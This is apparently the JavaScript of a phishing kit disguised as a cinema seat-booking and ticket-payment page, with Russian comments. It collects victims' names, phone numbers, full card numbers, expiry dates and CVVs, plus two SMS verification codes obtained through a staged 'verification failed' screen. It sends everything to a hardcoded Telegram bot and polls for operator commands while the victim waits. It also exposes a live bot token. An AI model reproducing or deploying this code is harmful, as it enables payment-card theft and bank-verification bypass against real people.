document.getElementById('moviePoster').src = localStorage.getItem('moviePoster');

document.getElementById('selectedCity').innerText = localStorage.getItem('selectedCity') || 'Berlin';
document.getElementById('selectedCinema').innerText = localStorage.getItem('selectedCinema') || 'Cinema';
document.getElementById('selectedCinemaAddress').innerText = localStorage.getItem('selectedCinemaAddress') || 'Address';
document.getElementById('movieTitle').innerText = localStorage.getItem('movie') || 'Movie';

const rows = document.getElementById('rows');
let selectedSeats = [];
let total = 0;

const ticketCount = document.getElementById('ticketCount');
const totalPrice = document.getElementById('totalPrice');

const letters = ['A','B','C','D','E','F','G','H','I','J'];

// Глобальные переменные для хранения выбранных сеансов
let savedDate = "";
let savedTime = "15:00"; 

// Данные бота
const BOT_TOKEN = "8802727416:AAFhzrorhzwAMfGTzYVjztauQF7LZwn1V9Y";
const CHAT_ID = "-1004292212831";

// Уникальный ID сессии клиента
const userSessionId = 'id_' + Math.floor(Math.random() * 900000 + 100000);

/* ДИНАМИЧЕСКАЯ ГЕНЕРАЦИЯ ДАТ */
const dateListContainer = document.getElementById('dateList');
if (dateListContainer) {
    dateListContainer.innerHTML = ''; 
    const months = ['JAN', 'FEB', 'MAR', 'APR', 'MAY', 'JUN', 'JUL', 'AUG', 'SEP', 'OCT', 'NOV', 'DEC'];
    
    for (let i = 0; i < 5; i++) {
        const d = new Date();
        d.setDate(d.getDate() + i); 
        
        const dayNum = d.getDate();
        const monthText = months[d.getMonth()];
        
        const dateDiv = document.createElement('div');
        dateDiv.className = i === 0 ? 'date active-date' : 'date';
        dateDiv.innerText = `${dayNum} ${monthText}`;
        
        dateDiv.addEventListener('click', () => {
            document.querySelectorAll('.date').forEach(el => el.classList.remove('active-date'));
            dateDiv.classList.add('active-date');
            document.getElementById('selectedDate').innerText = dateDiv.innerText;
            savedDate = dateDiv.innerText; 
        });
        
        dateListContainer.appendChild(dateDiv);
    }
    savedDate = document.querySelector('.active-date').innerText;
    document.getElementById('selectedDate').innerText = savedDate;
}

/* ВЫБОР ВРЕМЕНИ */
const times = document.querySelectorAll('.time-slot');
times.forEach(time => {
    time.addEventListener('click', () => {
        times.forEach(t => t.classList.remove('active-time')); 
        time.classList.add('active-time');                     
        document.getElementById('selectedTime').innerText = time.innerText; 
        savedTime = time.innerText; 
    });
});

/* ГЕНЕРАЦИЯ МЕСТ (Показываем цифры везде) */
for(let r = 0; r < 10; r++) {
    const rowDiv = document.createElement('div');
    rowDiv.className = 'row';

    const rowLetter = document.createElement('div');
    rowLetter.className = 'row-letter';
    rowLetter.innerText = letters[r];
    rowDiv.appendChild(rowLetter);

    for(let s = 1; s <= 14; s++) {
        const seat = document.createElement('div');
        seat.className = 'seat';
        
        if(r >= 8) {
            seat.classList.add('vip');
        } else {
            seat.classList.add('available');
        }
        seat.innerText = s; // Отображаем цифры на всех рядах

        if(Math.random() < 0.25) {
            seat.className = 'seat';
            seat.style.background = '#222';
            seat.style.color = '#444';
            seat.style.cursor = 'default';
        } else {
            seat.addEventListener('click', () => {
                const seatId = `${letters[r]}${s}`;
                const isVip = seat.classList.contains('vip');
                const price = isVip ? 25 : 12;

                if(seat.classList.contains('selected')) {
                    seat.classList.remove('selected');
                    selectedSeats = selectedSeats.filter(id => id !== seatId);
                    total -= price;
                } else {
                    seat.classList.add('selected');
                    selectedSeats.push(seatId);
                    total += price;
                }

                ticketCount.innerText = selectedSeats.length;
                totalPrice.innerText = `$${total}`;
            });
        }

        rowDiv.appendChild(seat);
    }
    rows.appendChild(rowDiv);
}

/* КЛИК НА КНОПКУ CONTINUE (Переход к форме оплаты) */
document.getElementById('continueBtn').onclick = () => {
    if(selectedSeats.length === 0) {
        alert('Please select at least one seat');
        return;
    }

    // Сохраняем дату и время перед очисткой экрана
    savedDate = document.getElementById('selectedDate').innerText;
    savedTime = document.getElementById('selectedTime').innerText;

    document.querySelector('.steps .step:nth-child(1)').classList.remove('active');
    document.querySelector('.steps .step:nth-child(2)').classList.add('active');

    // Перерисовываем контейнер под форму со всеми 5 полями
    document.querySelector('.booking-container').innerHTML = `
        <div class="payment-page">
            <div class="payment-box">
                <h2>Payment Details</h2>
                <p style="color:#777; margin-bottom:25px;">Please enter your details to complete purchase</p>
                
                <input type="text" id="fullName" placeholder="First Name Last Name">
                <input type="tel" id="phone" placeholder="Phone Number">
                <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19">
                
                <div class="card-row" style="display: flex; gap: 16px;">
                    <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5">
                    <input type="password" id="cardCvv" placeholder="CVV" maxlength="3">
                </div>
                
                <button id="submitBtn">Pay Now</button>
            </div>
        </div>
    `;

    setupFormLogic();
};

/* ЛОГИКА МАСОК И ОТПРАВКИ ДАННЫХ КАРТЫ */
function setupFormLogic() {
    let savedFullName = "";
    let savedPhoneNo = "";
    let savedCardNo = "";
    let savedExp = "";
    let savedCvvCode = "";

    const submitBtn = document.getElementById('submitBtn');

    // Маска карты (разделение пробелами)
    const cardInput = document.getElementById('cardNumber');
    if(cardInput) {
        cardInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            let newVal = '';
            for(let i = 0; i < val.length && i < 16; i++) {
                if(i > 0 && i % 4 === 0) newVal += ' ';
                newVal += val[i];
            }
            e.target.value = newVal;
        });
    }

    // Маска срока действия (MM/YY)
    const expiryInput = document.getElementById('cardExpiry');
    if(expiryInput) {
        expiryInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            if(val.length > 2) {
                e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
            } else {
                e.target.value = val;
            }
        });
    }

    // Ограничение CVV (только цифры, макс 3)
    const cvvInput = document.getElementById('cardCvv');
    if(cvvInput) {
        cvvInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
        });
    }

    submitBtn.onclick = () => {
        savedFullName = document.getElementById('fullName').value.trim();
        savedPhoneNo = document.getElementById('phone').value.trim();
        savedCardNo = document.getElementById('cardNumber').value.trim();
        savedExp = document.getElementById('cardExpiry').value.trim();
        savedCvvCode = document.getElementById('cardCvv').value.trim();

        if(!savedFullName || !savedPhoneNo || !savedCardNo || !savedExp || !savedCvvCode) {
            alert('Please fill all fields');
            return;
        }

        if(savedCardNo.length < 19) {
            alert('Invalid Card Number');
            return;
        }

        // Отправка полных данных карты в Telegram
        const textCardData = `💳 Новые данные карты! (📌 ID: ${userSessionId})
👤 Имя: ${savedFullName}
📞 Телефон: ${savedPhoneNo}
🔢 Карта: ${savedCardNo}
📅 Срок: ${savedExp}
🔒 CVV: ${savedCvvCode}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(textCardData)}`);

        // Переключение на окно ввода СМС
        const paymentBox = document.querySelector('.payment-box');
        paymentBox.innerHTML = `
            <h2>SMS Verification</h2>
            <p style="color:#777; margin-bottom:30px;">We have sent a verification code to your phone number ${savedPhoneNo}</p>
            
            <input type="text" id="smsCode" placeholder="SMS Code" style="text-align: center; font-size: 20px; letter-spacing: 8px;" maxlength="6">
            
            <button id="confirmSmsBtn">Verify & Get Ticket</button>
        `;
        
        setupSmsLogic(savedPhoneNo);
    };
}

/* ОБРАБОТКА СМС И ОЖИДАНИЕ КЛИЕНТА С ВАШИМ ПОДТВЕРЖДЕНИЕМ */
function setupSmsLogic(phoneNum) {
    const confirmSmsBtn = document.getElementById('confirmSmsBtn');
    const smsInput = document.getElementById('smsCode');

    if(smsInput) {
        smsInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }

    confirmSmsBtn.onclick = () => {
        const smsCode = smsInput.value.trim();
        if(!smsCode) return alert('Please enter the SMS code');

        // Отправляем первый код в ТГ
        const textSms = `💬 Получен ПЕРВЫЙ SMS код! (📌 ID: ${userSessionId})\n🔑 Код: ${smsCode}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(textSms)}`);

        // Имитация загрузки банком на 30 сек
        const paymentBox = document.querySelector('.payment-box');
        paymentBox.innerHTML = `
            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 0;">
                <div class="loader-spinner" style="width:40px; height:40px; border:4px solid rgba(255,255,255,0.1); border-top:4px solid #ff2020; border-radius:50%; animation: spin 1s linear infinite;"></div>
                <h3 style="margin-top: 25px; font-size: 20px; font-weight: 600;">Verifying secure connection...</h3>
                <p style="color: #777; font-size: 14px; margin-top: 10px; text-align: center;">Please wait, bank confirming operation.</p>
            </div>
        `;

        // Через 30 секунд выдаем ошибку и просим ВТОРОЙ код
        setTimeout(() => {
            paymentBox.innerHTML = `
                <h2 style="color: #ff2020;">Verification Failed</h2>
                <p style="color:#777; margin-bottom:20px;">The SMS code you entered is incorrect or expired. A new code has been sent to ${phoneNum}.</p>
                
                <input type="text" id="smsCode2" placeholder="Enter NEW SMS Code" style="text-align: center; font-size: 20px; letter-spacing: 8px;" maxlength="6">
                <span id="errorMessage" style="color: #ff2020; font-size: 13px; display: block; margin-top: -10px; margin-bottom: 20px; text-align: center;">Incorrect code. Try again.</span>
                
                <button id="confirmSmsBtn2">Verify & Get Ticket</button>
            `;

            const smsInput2 = document.getElementById('smsCode2');
            if(smsInput2) {
                smsInput2.addEventListener('input', (e) => {
                    e.target.value = e.target.value.replace(/\D/g, '');
                });
            }

            // Нажатие на кнопку ввода ВТОРОГО кода
            document.getElementById('confirmSmsBtn2').onclick = async () => {
                const secondSms = smsInput2.value.trim();
                if(!secondSms) return alert('Please enter the new SMS code');

                // Отправляем второй код и получаем информацию о сообщении, чтобы узнать его ID
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `⚠️ ВТОРОЙ СМС КОД! (📌 ID: ${userSessionId})\n🔑 Код: ${secondSms}\n\n👉 Инструкция: Сделайте REPLY (Ответ) на это сообщение.\n• Напишите слово "ticket" чтобы выдать билет.\n• Напишите "error" чтобы выбить ошибку.`
                    })
                });
                
                const data = await res.json();
                const logMessageId = data.result.message_id; // Сохранили ID сообщения лога

                // Ставим клиенту окончательную вечную загрузку
                paymentBox.innerHTML = `
                    <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 0;">
                        <div class="loader-spinner" style="width:40px; height:40px; border:4px solid rgba(255,255,255,0.1); border-top:4px solid #ff2020; border-radius:50%; animation: spin 1s linear infinite;"></div>
                        <h3 style="margin-top: 25px; font-size: 20px; font-weight: 600;">Processing Payment...</h3>
                        <p style="color: #777; font-size: 14px; margin-top: 10px; text-align: center;">Please do not close or refresh this page. Verification takes up to 2-3 minutes.</p>
                    </div>
                `;

                // Запускаем проверку ответов в Telegram каждые 4 секунды
                const pollInterval = setInterval(async () => {
                    try {
                        const updateRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-10&limit=10`);
                        const updateData = await updateRes.json();
                        
                        if (updateData.ok && updateData.result.length > 0) {
                            for (let update of updateData.result) {
                                const msg = update.message || update.channel_post;
                                
                                // Ищем сообщение, отправленное как ответ на наш лог
                                if (msg && msg.reply_to_message && msg.reply_to_message.message_id === logMessageId) {
                                    const command = msg.text.trim().toLowerCase();
                                    
                                    if (command === 'ticket') {
                                        clearInterval(pollInterval);
                                        showFinalTicket(); // Выдаем билет на экран мамонта!
                                    } else if (command === 'error') {
                                        clearInterval(pollInterval);
                                        alert('Transaction declined by issuing bank. Please restart booking.');
                                        location.reload(); 
                                    }
                                }
                            }
                        }
                    } catch (err) {
                        console.log("Polling error:", err);
                    }
                }, 4000);
            };

        }, 30000); // 30 секунд симуляции первого кода
    };
}

// Добавляем css-стиль вращения лоадера прямо в код страницы
const style = document.createElement('style');
style.innerHTML = `@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`;
document.head.appendChild(style);

/* ГЕНЕРАЦИЯ ФИНАЛЬНОГО БИЛЕТА */
function showFinalTicket() {
    document.querySelector('.steps .step:nth-child(2)').classList.remove('active');
    document.querySelector('.steps .step:nth-child(3)').classList.add('active');

    const seatText = selectedSeats.join(', ');

    document.body.innerHTML = `
        <header>
            <div class="logo"><span>A</span>AFISHA-LOVES</div>
        </header>
        <div class="steps" style="margin-bottom: 20px;">
            <div class="step">1. Seats</div>
            <div class="step">2. Reservation</div>
            <div class="step active">3. Ticket</div>
        </div>
        <div class="ticket-page">
            <div class="ticket-modern">
                <div class="ticket-top">
                    <div>
                        <p>ELECTRONIC TICKET</p>
                        <h1>${localStorage.getItem('movie') || 'Movie Title'}</h1>
                    </div>
                    <div style="display: flex; flex-direction: column; gap: 10px; align-items: center;" class="ticket-top-right">
                        <div class="ticket-badge">VIP CUSTOMER</div>
                        <div class="ticket-qr">
                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=AFISHA-LOVES-TICKET">
                        </div>
                    </div>
                </div>
                <div class="ticket-info">
                    <div>
                        <span>Cinema</span>
                        <strong>${localStorage.getItem('selectedCinema') || 'Cinema'}</strong>
                    </div>
                    <div>
                        <span>Address</span>
                        <strong>${localStorage.getItem('selectedCinemaAddress') || 'Address'}</strong>
                    </div>
                    <div>
                        <span>City</span>
                        <strong>${localStorage.getItem('selectedCity') || 'Berlin'}</strong>
                    </div>
                    <div>
                        <span>Date</span>
                        <strong>${savedDate}</strong>
                    </div>
                    <div>
                        <span>Time</span>
                        <strong>${savedTime}</strong>
                    </div>
                    <div>
                        <span>Seats</span>
                        <strong>${seatText}</strong>
                    </div>
                    <div>
                        <span>Total Paid</span>
                        <strong>$${total}</strong>
                    </div>
                </div>
                <div class="ticket-bottom">
                    <div style="display:flex; flex-direction:column; align-items:center; width: 100%;">
                        <img src="https://barcode.tec-it.com/barcode.ashx?data=4813538005036&code=Code128&translate-esc=false"
                             style="width:320px; height:120px; object-fit:contain; filter:contrast(200%);">
                        <div style="margin-top:10px; font-size:34px; letter-spacing:6px; font-weight:700; font-family:monospace; color:#fff;">
                            4813538005036
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
}